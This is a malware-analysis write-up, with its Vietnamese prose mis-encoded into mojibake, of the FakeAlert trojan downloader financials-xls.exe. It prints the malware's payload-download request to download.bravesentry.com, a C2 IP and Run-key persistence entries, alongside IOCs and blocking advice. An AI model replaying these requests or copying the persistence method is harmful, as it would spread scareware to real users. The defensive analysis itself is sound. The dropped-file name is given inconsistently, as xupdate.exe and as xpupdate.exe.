---
title: Financials-xls.exe
date: 2025-08-05 11:30:00 +0700
categories: [Malware Analysis, Dynamic]
tags: [persistence, fakealert, trojan, downloader]
description: Ph√¢n t√≠ch h√†nh vi c·ªßa m·∫´u m√£ ƒë·ªôc financials-xls.exe ‚Äì d·∫°ng trojan FakeAlert, c√≥ persistence v√† kh·∫£ nƒÉng t·∫£i xu·ªëng BraveSentry.
---


## üéØ M·ª•c ti√™u

- Ph√¢n t√≠ch tƒ©nh & ƒë·ªông m·∫´u `financials-xls.exe`
- Ghi nh·∫≠n IOC v√† chu·ªói h√†nh vi: persistence + downloader (FakeAlert / scareware)
- ƒê∆∞a ra khuy·∫øn ngh·ªã ph√°t hi·ªán & ·ª©ng ph√≥

---

## üßä 1. Ph√¢n t√≠ch tƒ©nh

**File name:** `financials-xls.exe`

**MD5:** `27599c22e0eba42f3e91e27fe1d04598`

**ƒê√°nh gi√° ban ƒë·∫ßu (VirusTotal):** Trojan.FakeAlert

### üîπ VirusTotal / c·∫£nh b√°o

![VirusTotal detection](/resources/Financials-xls/Pasted%20image%2020251001113548.png)

### üîπ EXEinfoPE ‚Äî Packed, GUI, 32-bit
- EXE b√°o **32-bit, GUI, packed**.
- D√πng UPX ƒë·ªÉ unpack th√†nh c√¥ng ‚Üí chuy·ªÉn sang ph√¢n t√≠ch tƒ©nh s√¢u h∆°n.

![EXEinfoPE](/resources/Financials-xls/Pasted%20image%2020251001101000.png)

![UPX unpacked](/resources/Financials-xls/Pasted%20image%2020251001101205.png)

### üîπ PeStudio ‚Äî Indicators / Imports / Sections
#### Indicators (c·∫ßn ch√∫ √Ω)
![PeStudio Indicators](/resources/Financials-xls/Pasted%20image%2020251001101313.png)

- File c√≥ signature `Installer VISE Custom` (level 1 c·∫£nh b√°o).
- Section `.text` ƒë∆∞·ª£c ƒë√°nh d·∫•u **writable** v√† **self-modifying** ‚Üí kh·∫£ nƒÉng runtime patching.
- Th∆∞ vi·ªán m·∫°ng (Windows Sockets) xu·∫•t hi·ªán ‚Üí kh·∫£ nƒÉng s·ª≠ d·ª•ng socket.

#### Import table
![PeStudio Imports](/resources/Financials-xls/Pasted%20image%2020251001101444.png)

- Import nhi·ªÅu API li√™n quan ƒë·∫øn **network**, **registry**, **process**, **UI/notification** ‚Üí t∆∞∆°ng th√≠ch v·ªõi h√†nh vi downloader + persistence + fake alert.

#### Strings ‚Äî d·∫•u hi·ªáu downloader / fake alert
![PeStudio Strings](/resources/Financials-xls/Pasted%20image%2020251001101927.png)

M·ªôt s·ªë chu·ªói n·ªïi b·∫≠t (bi√™n t·∫≠p ƒë·ªÉ d·ªÖ ƒë·ªçc):

- `GET /download.php?&advid=00000717&u=%u&p=%u HTTP/1.0\r\nHost: download.bravesentry.com\r\n\r\n`
- `GET http://download.bravesentry.com/download.php?&advid=00000717&u=%u&p=%u HTTP/1.0\r\nHost: download.bravesentry.com\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n`
- Th√¥ng tin ƒë∆∞·ªùng d·∫´n & t√™n ·ª©ng d·ª•ng gi·∫£: `C:\Program Files\BraveSentry\BraveSentry.exe`
- IP li√™n quan: `69.50.175.181`

‚Üí R·∫•t c√≥ kh·∫£ nƒÉng ƒë√¢y l√† **downloader/dropper** cho BraveSentry (rogue software / scareware).

M·ªôt s·ªë chu·ªói HTML/template c·∫£nh b√°o gi·∫£ c≈©ng ƒë∆∞·ª£c t√¨m th·∫•y (d√πng ƒë·ªÉ hi·ªÉn th·ªã fake alert).
![HTML template & other strings](/resources/Financials-xls/Pasted%20image%2020251001112935.png)

---

## ‚öôÔ∏è 2. Ph√¢n t√≠ch ƒë·ªông

> Lup-run trong m√¥i tr∆∞·ªùng c√¥ l·∫≠p (VM), b·∫≠t ProcMon / Regshot / network capture (Fakenet) ƒë·ªÉ quan s√°t.

### üî∏ 1) Hi·ªán c·∫£nh b√°o gi·∫£ (Fake Alert GUI)
Khi ch·∫°y, ·ª©ng d·ª•ng hi·ªán c·ª≠a s·ªï c·∫£nh b√°o/gi·∫£ m·∫°o (scareware) ƒë·ªÉ d·ª• ng∆∞·ªùi d√πng t∆∞∆°ng t√°c / click.
![Fake Alert Window](/resources/Financials-xls/Pasted%20image%2020251001114452.png)

### üî∏ 2) T·∫£i payload t·ª´ remote (downloader behavior)
Quan s√°t network: ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán request t·ªõi `download.bravesentry.com` ƒë·ªÉ t·∫£i v·ªÅ payload (BraveSentry.exe ho·∫∑c t∆∞∆°ng t·ª±).

![Network request to BraveSentry](/resources/Financials-xls/Pasted%20image%2020251001114626.png)

**M·∫´u request:**
```

GET /download.php?&advid=00000717&u=<user>&p=<pass> HTTP/1.0
Host: download.bravesentry.com
Pragma: no-cache
Cache-Control: no-cache

```

‚Üí m·ª•c ti√™u t·∫£i ch∆∞∆°ng tr√¨nh gi·∫£ m·∫°o/installer xu·ªëng v√† c√≥ th·ªÉ th·ª±c thi n√≥.

### üî∏ 3) Persistence ‚Äî registry Run keys (Regshot)
Regshot diff cho th·∫•y malware ghi c√°c Run entries:

![Regshot diff](/resources/Financials-xls/Pasted%20image%2020251001115031.png)

- `HKU\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows update loader` ‚Üí `"C:\Windows\xpupdate.exe"`
- `HKU\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\con` ‚Üí `"C:\Users\COMPUTER\Desktop\malware-sample\financials-xls2.exe"`

‚Üí Malware c·ªë g·∫Øng thi·∫øt l·∫≠p autostart qua `Run` ƒë·ªÉ duy tr√¨ persistence.

### üî∏ 4) File artifacts (drop)
C√°c file ƒë∆∞·ª£c t·∫°o / copy:

- `C:\Users\COMPUTER\AppData\Roaming\Install.dat`
- `C:\Windows\xupdate.exe` (c√πng hash v·ªõi binary g·ªëc `financials-xls.exe`)

> Ghi v√†o `C:\Windows` th∆∞·ªùng y√™u c·∫ßu **quy·ªÅn Administrator**, cho th·∫•y malware c·ªë g·∫Øng leo thang ho·∫∑c y√™u c·∫ßu quy·ªÅn cao h∆°n.

### üî∏ 5) ProcMon timeline ‚Äî s∆° ƒë·ªì h√†nh vi
ProcMon trace ph√°c th·∫£o lu·ªìng h√†nh vi:

![ProcMon behavior diagram](/resources/Financials-xls/Pasted%20image%2020251001121636.png)

T√≥m t·∫Øt:

- Process `financials-xls2.exe` kh·ªüi ch·∫°y ‚Üí spawn 2 thread ch√≠nh.
  - Thread A: t·∫°o/ghi Run key `Windows update loader` ‚Üí point t·ªõi `C:\Windows\xpupdate.exe`.
  - Thread B: t·∫°o `Install.dat` trong AppData ‚Üí c√≥ th·ªÉ ch·ª©a config ho·∫∑c payload giai ƒëo·∫°n 2.
- B√™n c·∫°nh ƒë√≥, process th·ª±c hi·ªán HTTP request t·ªõi `download.bravesentry.com` ƒë·ªÉ t·∫£i payload.

---

## üö® K·∫øt lu·∫≠n

### ‚úÖ T√≥m t·∫Øt h√†nh vi ch√≠nh
- **Lo·∫°i m√£ ƒë·ªôc:** Trojan downloader / FakeAlert (scareware) ‚Äî m·ª•c ti√™u d·ª• ng∆∞·ªùi d√πng c√†i ph·∫ßn m·ªÅm gi·∫£ m·∫°o.
- **Persistence:** Thi·∫øt l·∫≠p Run key (`Windows update loader`, `con`) ƒë·ªÉ t·ª± kh·ªüi ƒë·ªông sau login.
- **Drop & Copy:** Ghi b·∫£n sao v√†o `C:\Windows\xupdate.exe` (same hash), t·∫°o `Install.dat` trong AppData.
- **Network:** Request t·ªõi `download.bravesentry.com` (`69.50.175.181`) ƒë·ªÉ t·∫£i BraveSentry ho·∫∑c c√°c payload ph·ª•.
- **Quy·ªÅn:** H√†nh vi ghi v√†o `C:\Windows` g·ª£i √Ω c·∫ßn quy·ªÅn admin.

### üéØ M·ª©c ƒë·ªô r·ªßi ro
- Trung b√¨nh ‚Üí cao: c√≥ persistence v√† t·∫£i th√™m m√£ ƒë·ªôc (k·ªãch b·∫£n multi-stage).
- N·∫øu payload th·ª© c·∫•p c√≥ backdoor/RAT th√¨ r·ªßi ro s·∫Ω tƒÉng r·∫•t cao.

---

## üìå IOC (Indicators of Compromise)

| Lo·∫°i               | Gi√° tr·ªã                                                                                                                                                   |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| File name          | `financials-xls.exe`                                                                                                                                      |
| MD5                | `27599c22e0eba42f3e91e27fe1d04598`                                                                                                                        |
| C2 / Download host | `download.bravesentry.com`                                                                                                                                |
| C2 IP              | `69.50.175.181`                                                                                                                                           |
| File drops         | `C:\Windows\xpupdate.exe` (same hash as original) <br> `C:\Users\<user>\AppData\Roaming\Install.dat`                                                      |
| Registry keys      | `HKCU\...\Run\Windows update loader` = `C:\Windows\xpupdate.exe` <br> `HKCU\...\Run\con` = `C:\Users\COMPUTER\Desktop\malware-sample\financials-xls2.exe` |

---

## üõ°Ô∏è Khuy·∫øn ngh·ªã ·ª©ng ph√≥ & ph√°t hi·ªán

- **Ch·∫∑n** domain `download.bravesentry.com` v√† IP `69.50.175.181` tr√™n firewall/proxy.
- **Qu√©t** h·ªá th·ªëng t√¨m file `xpupdate.exe` trong `C:\Windows` v√† file `Install.dat` trong AppData ‚Üí c√°ch ly & hash-check.
- **Ki·ªÉm tra registry**: t√¨m c√°c Run entries c√≥ t√™n l·∫° nh∆∞ `Windows update loader`, `con` v√† x√≥a/c√°ch ly.
- **Thu th·∫≠p** memory dump & network capture n·∫øu ph√°t hi·ªán ti·∫øn tr√¨nh ƒëang ch·∫°y ƒë·ªÉ ph√¢n t√≠ch payload th·ª© c·∫•p.
- **C·∫£nh b√°o ng∆∞·ªùi d√πng**: kh√¥ng ch·∫°y file ƒë√≠nh k√®m t·ª´ ngu·ªìn kh√¥ng r√µ; c·∫£nh b√°o v·ªÅ c√°c c·ª≠a s·ªï ‚Äúscan/alert‚Äù y√™u c·∫ßu c√†i ph·∫ßn m·ªÅm.

---
